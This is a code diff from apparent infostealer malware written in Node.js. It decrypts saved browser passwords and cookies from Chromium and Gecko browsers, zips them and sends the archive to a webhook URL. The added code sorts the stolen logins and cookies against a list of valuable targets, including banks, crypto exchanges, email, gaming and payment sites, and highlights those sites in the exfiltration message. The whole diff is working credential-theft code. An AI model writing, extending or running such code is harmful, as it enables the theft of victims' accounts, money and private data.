@@ -11,6 +11,12 @@ const hardware = require('./../../utils/hardware/hardware.js');
 
 const browsersProfiles = require('./profiles.js');
 
+const { Chromium } = require('./chromium.js');
+const chromium = new Chromium();
+
+const { Gecko } = require('./gecko.js');
+const gecko = new Gecko();
+
 const browsers = {
     downloads: [],
     historys: [],
@@ -48,8 +54,6 @@ const Chromiumbrowsers = async () => {
                 browser: browser
             }));
 
-            const { Chromium } = require('./chromium.js');
-            const chromium = new Chromium();
             const MasterKey = chromium.GetMasterKey(fullPath)
 
             if (!MasterKey) {
@@ -104,8 +108,6 @@ const Geckobrowsers = async () => {
             }
 
             for (const profile of profilePaths) {
-                const { Gecko } = require('./gecko.js');
-                const gecko = new Gecko();
                 const MasterKey = await gecko.GetMasterKey(profile.path, '')
 
                 if (!MasterKey) {
@@ -196,6 +198,46 @@ module.exports = async (webhookUrl) => {
         await fileutil.writeDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies)
     }
 
+    const keywords = (data) => {
+        const sites = [
+            "replit", "hostinger", "cloudflare", "origin", "amazon", "twitter", "aliexpress", "netflix", "roblox", "twitch",
+            "facebook", "riotgames", "card", "github", "telegram", "protonmail", "gmail", "youtube", "onoff",
+            "xss.is", "pronote", "ovhcloud", "nulled", "cracked", "tiktok", "yahoo", "gmx", "aol",
+            "coinbase", "binance", "steam", "epicgames", "discord", "paypal", "instagram", "spotify",
+            "onlyfans", "pornhub",
+        ];
+
+        const loginSites = new Set();
+        const cookieSites = new Set();
+
+        data.forEach(item => {
+            const url = item.origin_url;
+            const match = url.match(/(?:https?:\/\/)?(?:www\.)?(\.?([^\/]+))?(.*)/);
+
+            if (match) {
+                const parts = match[2]?.split('.') || [];
+                const domain = parts.length > 1
+                    ? parts[parts.length - 2] + '.' + parts[parts.length - 1]
+                    : parts[0];
+
+                if (sites.some(site => domain.includes(site))) {
+                    if (item.source === 'logins') {
+                        loginSites.add(domain);
+                    } else if (item.source === 'cookies') {
+                        cookieSites.add(domain);
+                    }
+                }
+            }
+        });
+
+        return {
+            loginSites: Array.from(loginSites),
+            cookieSites: Array.from(cookieSites)
+        }
+    };
+
+    const resultKeywords = keywords([...chromium.GetSites(), ...gecko.GetSites()]);
+
     const browserTempZip = path.join(os.tmpdir(), 'browsers.zip');
     try {
         await fileutil.zipDirectory({
@@ -203,12 +245,44 @@ module.exports = async (webhookUrl) => {
             outputZip: browserTempZip
         });
 
-        await requests.webhook(webhookUrl, {
+        const data = {
             embeds: [{
                 title: 'Browsers',
                 description: '```' + fileutil.tree(browserTempDir) + '```',
             }]
-        }, [browserTempZip]);
+        };
+
+        if (
+            resultKeywords.loginSites.length > 0 ||
+            resultKeywords.cookieSites.length > 0
+        ) {
+            data.embeds.unshift({
+                title: 'Keywords',
+                fields: [],
+            });
+        };
+
+        if (resultKeywords.loginSites.length > 0) {
+            data.embeds[0].fields.push({
+                name: 'Logins',
+                value: resultKeywords.loginSites
+                    .map(x =>'[`' + x + '`](https://' + x + ')')
+                    .join(', '),
+                inline: false
+            });
+        };
+
+        if (resultKeywords.cookieSites.length > 0) {
+            data.embeds[0].fields.push({
+                name: 'Cookies',
+                value: resultKeywords.cookieSites
+                    .map(x => '[`' + x + '`](https://' + x + ')')
+                    .join(', '),
+                inline: false
+            });
+        };
+
+        await requests.webhook(webhookUrl, data, [browserTempZip]);
 
         const WishTempDir = fileutil.WishTempDir('browsers');
         await fileutil.copy(browserTempDir, WishTempDir);
